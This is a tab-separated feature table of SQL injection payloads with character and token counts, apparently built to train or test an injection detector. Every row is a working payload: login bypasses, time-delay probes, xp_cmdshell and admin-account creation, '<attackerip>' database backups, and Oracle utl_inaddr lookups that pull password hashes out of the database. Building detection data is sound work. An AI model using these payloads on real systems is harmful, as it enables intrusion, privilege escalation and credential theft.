attack	d_char	d_token_sqli	d_token_xss	d_token_ci	punck	s_token	space	length
1 or benchmark(10000000,md5(1))#	1	3	0	0	5	3	2	32
 or ''='	4	1	0	0	1	0	2	8
hi' or 'x'='x';	6	1	0	0	2	0	2	15
") or sleep(__time__)="	3	1	0	1	3	0	2	23
 or 'whatever' in ('whatever')	4	1	0	0	4	1	4	30
; begin declare @var varchar(8000) set @var=' ...	2	4	0	0	8	3	7	49
 union select 1,load_file('/etc/passwd'),1,1,1;	2	3	0	0	7	1	3	47
a' or 1=1--	2	1	1	0	2	2	2	11
a' or 'a' = 'a	5	1	3	0	2	0	4	14
declare @s varchar(22) select @s =	1	2	2	0	4	2	5	34
 or a=a--	1	1	2	0	2	0	2	9
 or '1'='1	4	1	0	0	1	2	2	10
 or sleep(__time__)='	2	1	0	1	2	0	2	21
or 0=0 #"	3	1	0	0	0	2	2	9
declare @s varchar (8000) select @s = 0x73656c ...	1	2	2	0	7	3	8	50
) or benchmark(10000000,md5(1))#	1	3	0	0	6	2	2	32
;waitfor delay '0:0:__time__'--	2	2	0	0	6	2	2	31
 or 'text' > 't'	5	1	0	0	2	0	4	16
 or benchmark(10000000,md5(1))#	1	3	0	0	5	2	2	31
");waitfor delay '0:0:__time__'--	3	2	0	0	7	2	2	33
a' or 3=3--	2	1	1	0	2	2	2	11
 or ''='	4	1	0	0	1	0	2	8
")) or sleep(__time__)="	3	1	0	1	4	0	2	24
 or 'x'='x	4	1	0	0	1	0	2	10
 or 'something' = 'some'+'thing'	7	1	0	0	3	0	4	32
) or (a=a	1	1	2	0	2	0	2	9
x' and 1=(select count(*) from tabname); --	2	2	0	0	8	3	6	43
; or '1'='1'	5	1	0	0	2	2	2	12
declare @q nvarchar (200) select @q = 0x770061 ...	1	2	2	0	7	3	8	50
; exec ('sel' + 'ect us' + 'er')	6	1	0	0	8	0	7	32
anything' or 'x'='x	5	1	0	0	1	0	2	19
declare @q nvarchar (4000) select @q =	1	2	2	0	4	2	6	38
 select name from syscolumns where id = (sele ...	1	1	2	0	4	2	9	49
hi or a=a	1	1	2	0	0	0	2	9
);waitfor delay '0:0:__time__'--	2	2	0	0	7	2	2	32
") or benchmark(10000000,md5(1))#	2	3	0	0	6	2	2	33
)) or sleep(__time__)='	2	1	0	1	4	0	2	23
or 1=1 or ""=	4	2	0	0	0	2	3	13
 union select * from users where login = char ...	1	3	0	0	4	3	10	49
x' or 1=1 or 'x'='y	6	2	0	0	1	2	4	19
 or '1'='1'--	5	1	0	0	3	2	2	13
"a"" or 1=1--"	5	1	1	0	2	2	2	14
 or a = a	1	1	2	0	0	0	4	9
declare @q nvarchar (200) select @q = 0x770061006900740066006f0072002000640065006c00610079002000270030003a0030003a0031003000270000 exec(@q)	1	3	3	0	7	3	8	139
declare @s varchar(200) select @s = 0x77616974666f722064656c61792027303a303a31302700 exec(@s) 	1	3	3	0	7	3	8	94
declare @q nvarchar (200) 0x730065006c00650063007400200040004000760065007200730069006f006e00 exec(@q)	0	2	2	0	6	3	5	101
declare @s varchar (200) select @s = 0x73656c65637420404076657273696f6e exec(@s)	1	3	3	0	7	3	8	80
x' or full_name like '%bob%	4	1	0	0	1	1	4	27
'; exec master..xp_cmdshell 'ping 172.10.1.255'--	3	3	0	0	9	4	4	49
' or ''='	5	1	0	0	1	0	2	9
' or 'x'='x	5	1	0	0	1	0	2	11
') or ('x'='x	5	1	0	0	3	0	2	13
' or 0=0 #	3	1	0	0	0	2	3	10
 or 0=0 #"	3	1	0	0	0	2	3	10
' or '1'='1'--	6	1	0	0	3	2	2	14
' or 1=1 or ''='	6	2	0	0	1	2	4	16
 or 1=1 or ""=	4	2	0	0	0	2	4	14
' or a=a--	2	1	2	0	2	0	2	10
 or a=a	1	1	2	0	0	0	2	7
') or ('a'='a	5	1	2	0	3	0	2	13
'hi' or 'x'='x';	7	1	0	0	2	0	2	16
' or username like '%	3	1	0	0	1	1	4	21
' or uname like '%	3	1	0	0	1	1	4	18
' or userid like '%	3	1	0	0	1	1	4	19
' or uid like '%	3	1	0	0	1	1	4	16
' or user like '%	3	1	0	0	1	1	4	17
t'exec master..xp_cmdshell 'nslookup www.google.com'--	3	2	0	0	7	0	3	54
<>"'%;)(&+	5	0	0	0	5	0	0	10
' or ''='	5	1	0	0	1	0	2	9
'; exec master..xp_cmdshell 'ping 10.10.1.2'--	3	3	0	0	9	4	4	46
'create user name identified by 'pass123' --	3	1	1	0	3	2	6	44
'create user name identified by pass123 temporary tablespace temp default tablespace users; 	1	3	2	0	1	3	12	92
'exec sp_addlogin 'name' , 'password' --	5	1	1	0	5	0	5	40
' exec sp_addsrvrolemember 'name' , 'sysadmin' --	5	1	1	0	5	0	6	49
' insert into mysql.user (user, host, password) values ('name', 'localhost', password('pass123')) --	7	2	1	0	16	2	11	100
' insert into users(login, password, level) values( char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72) + char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72),char(0x64)	1	12	0	0	37	14	25	190
' union (select null, (select @@version)) --	1	4	0	0	9	1	6	44
' union (select null, null, (select @@version)) --	1	5	0	0	10	1	7	50
' union (select null, null, null,  (select @@version)) --	1	6	0	0	11	1	9	57
' union (select null, null, null, null,  (select @@version)) --	1	7	0	0	12	1	10	63
' union (select null, null, null, null,  null, (select @@version)) --	1	8	0	0	13	1	11	69
exec master..xp_cmdshell 'ipconfig+/all'	2	3	0	0	5	1	2	41
exec master..xp_cmdshell 'net+view'	2	2	0	0	4	0	2	35
exec master..xp_cmdshell 'net+users'	2	2	0	0	4	1	2	36
exec master..xp_cmdshell 'ping+<attackerip>'	4	3	0	0	4	0	2	44
backup database master to disks='\\<attackerip>\<attackerip>\backupdb.dat'	7	1	0	0	5	0	4	74
create table myfile (line varchar(8000))" bulk insert foo from 'c:\inetpub\wwwroot\auth.aspв'" select * from myfile"--	5	4	1	0	13	4	13	118
1' and 1=(select count(*) from tablenames); --	2	2	0	0	8	4	6	46
1' or '1'='1	5	1	0	0	1	3	2	12
create table myfile (input text); load data infile '<filepath>' into table myfile; select * from myfile;	4	2	4	0	7	3	15	104
'or '' = '	5	1	0	0	2	0	3	10
' union select 1, '<user-fieldname>', '<pass-fieldname>' 1--	9	2	0	0	8	2	6	60
' or '1'='1	5	1	0	0	1	2	2	11
'||utl_http.request('http://192.168.1.1/')||'	5	0	1	0	11	4	0	45
' || myappadmin.adduser('admin', 'newpass') || '	8	0	0	0	7	0	5	48
' and 1=utl_inaddr.get_host_address((select banner from v$version where rownum=1)) and 'i'='i	8	5	2	0	6	5	9	93
' and 1=utl_inaddr.get_host_address((select sys.login_user from dual)) and 'i'='i	6	6	2	0	7	2	7	81
' and 1=utl_inaddr.get_host_address((select sys.database_name from dual)) and 'i'='i	6	6	2	0	7	2	7	84
' and 1=utl_inaddr.get_host_address((select host_name from v$instance)) and 'i'='i	7	5	2	0	6	2	7	82
' and 1=utl_inaddr.get_host_address((select global_name from global_name)) and 'i'='i	6	5	2	0	6	2	7	85
' and 1=utl_inaddr.get_host_address((select count(distinct(username)) from sys.all_users)) and 'i'='i	6	6	2	0	11	4	7	101
' and 1=utl_inaddr.get_host_address((select count(distinct(password)) from sys.user$)) and 'i'='i	7	6	2	0	11	4	7	97
' and 1=utl_inaddr.get_host_address((select count(distinct(table_name)) from sys.all_tables)) and 'i'='i	6	6	2	0	11	4	7	104
' and 1=utl_inaddr.get_host_address((select count(distinct(column_name)) from sys.all_tab_columns)) and 'i'='i	6	6	2	0	11	4	7	110
' and 1=utl_inaddr.get_host_address((select count(distinct(granted_role)) from dba_role_privs where grantee=sys.login_user)) and 'i'='i	7	6	2	0	11	5	9	135
' and 1=utl_inaddr.get_host_address((select distinct(username) from (select distinct(username), rownum as limit from sys.all_users) where limit=1)) and 'i'='i	7	9	2	0	14	8	15	158
' and 1=utl_inaddr.get_host_address((select distinct(password) from (select distinct(password), rownum as limit from sys.user$) where limit=1)) and 'i'='i	8	9	2	0	14	8	15	154
' and 1=utl_inaddr.get_host_address((select distinct(table_name) from (select distinct(table_name), rownum as limit from sys.all_tables) where limit=1)) and 'i'='i	7	9	2	0	14	8	15	163
' and 1=utl_inaddr.get_host_address((select distinct(column_name) from (select distinct(column_name), rownum as limit from all_tab_columns) where limit=1)) and 'i'='i	7	8	2	0	13	8	15	166
' and 1=utl_inaddr.get_host_address((select distinct(granted_role) from (select distinct(granted_role), rownum as limit from dba_role_privs where grantee=sys.loginuser) where limit=1)) and 'i'='i	8	9	2	0	14	9	17	195
' and 1=utl_inaddr.get_host_address((select distinct(username) from (select distinct(username), rownum as limit from sys.all_users) where limit=2)) and 'i'='i	7	9	2	0	14	8	15	158
' and 1=utl_inaddr.get_host_address((select distinct(password) from (select distinct(password), rownum as limit from sys.user$) where limit=2)) and 'i'='i	8	9	2	0	14	8	15	154
' and 1=utl_inaddr.get_host_address((select distinct(table_name) from (select distinct(table_name), rownum as limit from sys.all_tables) where limit=2)) and 'i'='i	7	9	2	0	14	8	15	163
' and 1=utl_inaddr.get_host_address((select distinct(column_name) from (select distinct(column_name), rownum as limit from all_tab_columns) where limit=2)) and 'i'='i	7	8	2	0	13	8	15	166
' and 1=utl_inaddr.get_host_address((select distinct(granted_role) from (select distinct(granted_role), rownum as limit from dba_role_privs where grantee=sys.loginuser) where limit=2)) and 'i'='i	8	9	2	0	14	9	17	195
' and 1=utl_inaddr.get_host_address((select distinct(username) from (select distinct(username), rownum as limit from sys.all_users) where limit=3)) and 'i'='i	7	9	2	0	14	8	15	158
' and 1=utl_inaddr.get_host_address((select distinct(password) from (select distinct(password), rownum as limit from sys.user$) where limit=3)) and 'i'='i	8	9	2	0	14	8	15	154
' and 1=utl_inaddr.get_host_address((select distinct(table_name) from (select distinct(table_name), rownum as limit from sys.all_tables) where limit=3)) and 'i'='i	7	9	2	0	14	8	15	163
' and 1=utl_inaddr.get_host_address((select distinct(column_name) from (select distinct(column_name), rownum as limit from all_tab_columns) where limit=3)) and 'i'='i	7	8	2	0	13	8	15	166
' and 1=utl_inaddr.get_host_address((select distinct(granted_role) from (select distinct(granted_role), rownum as limit from dba_role_privs where grantee=sys.loginuser) where limit=3)) and 'i'='i	8	9	2	0	14	9	17	195
' and 1=utl_inaddr.get_host_address((select distinct(username) from (select distinct(username), rownum as limit from sys.all_users) where limit=4)) and 'i'='i	7	9	2	0	14	8	15	158
' and 1=utl_inaddr.get_host_address((select distinct(password) from (select distinct(password), rownum as limit from sys.user$) where limit=4)) and 'i'='i	8	9	2	0	14	8	15	154
' and 1=utl_inaddr.get_host_address((select distinct(table_name) from (select distinct(table_name), rownum as limit from sys.all_tables) where limit=4)) and 'i'='i	7	9	2	0	14	8	15	163
' and 1=utl_inaddr.get_host_address((select distinct(column_name) from (select distinct(column_name), rownum as limit from all_tab_columns) where limit=4)) and 'i'='i	7	8	2	0	13	8	15	166
' and 1=utl_inaddr.get_host_address((select distinct(granted_role) from (select distinct(granted_role), rownum as limit from dba_role_privs where grantee=sys.loginuser) where limit=4)) and 'i'='i	8	9	2	0	14	9	17	195
' and 1=utl_inaddr.get_host_address((select distinct(username) from (select distinct(username), rownum as limit from sys.all_users) where limit=5)) and 'i'='i	7	9	2	0	14	8	15	158
' and 1=utl_inaddr.get_host_address((select distinct(password) from (select distinct(password), rownum as limit from sys.user$) where limit=5)) and 'i'='i	8	9	2	0	14	8	15	154
' and 1=utl_inaddr.get_host_address((select distinct(table_name) from (select distinct(table_name), rownum as limit from sys.all_tables) where limit=5)) and 'i'='i	7	9	2	0	14	8	15	163
' and 1=utl_inaddr.get_host_address((select distinct(column_name) from (select distinct(column_name), rownum as limit from all_tab_columns) where limit=5)) and 'i'='i	7	8	2	0	13	8	15	166
' and 1=utl_inaddr.get_host_address((select distinct(granted_role) from (select distinct(granted_role), rownum as limit from dba_role_privs where grantee=sys.loginuser) where limit=5)) and 'i'='i	8	9	2	0	14	9	17	195
' and 1=utl_inaddr.get_host_address((select distinct(username) from (select distinct(username), rownum as limit from sys.all_users) where limit=6)) and 'i'='i	7	9	2	0	14	8	15	158
' and 1=utl_inaddr.get_host_address((select distinct(password) from (select distinct(password), rownum as limit from sys.user$) where limit=6)) and 'i'='i	8	9	2	0	14	8	15	154
' and 1=utl_inaddr.get_host_address((select distinct(table_name) from (select distinct(table_name), rownum as limit from sys.all_tables) where limit=6)) and 'i'='i	7	9	2	0	14	8	15	163
' and 1=utl_inaddr.get_host_address((select distinct(column_name) from (select distinct(column_name), rownum as limit from all_tab_columns) where limit=6)) and 'i'='i	7	8	2	0	13	8	15	166
' and 1=utl_inaddr.get_host_address((select distinct(granted_role) from (select distinct(granted_role), rownum as limit from dba_role_privs where grantee=sys.loginuser) where limit=6)) and 'i'='i	8	9	2	0	14	9	17	195
' and 1=utl_inaddr.get_host_address((select distinct(username) from (select distinct(username), rownum as limit from sys.all_users) where limit=7)) and 'i'='i	7	9	2	0	14	8	15	158
' and 1=utl_inaddr.get_host_address((select distinct(password) from (select distinct(password), rownum as limit from sys.user$) where limit=7)) and 'i'='i	8	9	2	0	14	8	15	154
' and 1=utl_inaddr.get_host_address((select distinct(table_name) from (select distinct(table_name), rownum as limit from sys.all_tables) where limit=7)) and 'i'='i	7	9	2	0	14	8	15	163
' and 1=utl_inaddr.get_host_address((select distinct(column_name) from (select distinct(column_name), rownum as limit from all_tab_columns) where limit=7)) and 'i'='i	7	8	2	0	13	8	15	166
' and 1=utl_inaddr.get_host_address((select distinct(granted_role) from (select distinct(granted_role), rownum as limit from dba_role_privs where grantee=sys.loginuser) where limit=7)) and 'i'='i	8	9	2	0	14	9	17	195
' and 1=utl_inaddr.get_host_address((select distinct(username) from (select distinct(username), rownum as limit from sys.all_users) where limit=8)) and 'i'='i	7	9	2	0	14	8	15	158
' and 1=utl_inaddr.get_host_address((select distinct(password) from (select distinct(password), rownum as limit from sys.user$) where limit=8)) and 'i'='i	8	9	2	0	14	8	15	154
' and 1=utl_inaddr.get_host_address((select distinct(table_name) from (select distinct(table_name), rownum as limit from sys.all_tables) where limit=8)) and 'i'='i	7	9	2	0	14	8	15	163
' and 1=utl_inaddr.get_host_address((select distinct(column_name) from (select distinct(column_name), rownum as limit from all_tab_columns) where limit=8)) and 'i'='i	7	8	2	0	13	8	15	166
' and 1=utl_inaddr.get_host_address((select distinct(granted_role) from (select distinct(granted_role), rownum as limit from dba_role_privs where grantee=sys.loginuser) where limit=8)) and 'i'='i	8	9	2	0	14	9	17	195
select current_setting('log_connections');	2	2	0	0	4	0	1	42
select current_setting('log_statement');	2	2	0	0	4	0	1	40
select current_setting('port');	2	2	0	0	4	0	1	31
select current_setting('password_encryption');	2	2	0	0	4	0	1	46
select current_setting('krb_server_keyfile');	2	2	0	0	4	0	1	45
select current_setting('virtual_host');	2	2	0	0	4	0	1	39
select current_setting('port');	2	2	0	0	4	0	1	31
select current_setting('config_file');	2	2	0	0	4	0	1	38
select current_setting('hba_file');	2	2	0	0	4	0	1	35
select current_setting('data_directory');	2	2	0	0	4	0	1	41
sleep(1) /*‘ or sleep(1) or ‘“ or sleep(1) or “*/	0	4	0	3	8	3	9	49
sleep(1) /*' or sleep(1) or '" or sleep(1) or "*/	4	4	0	3	11	3	9	49
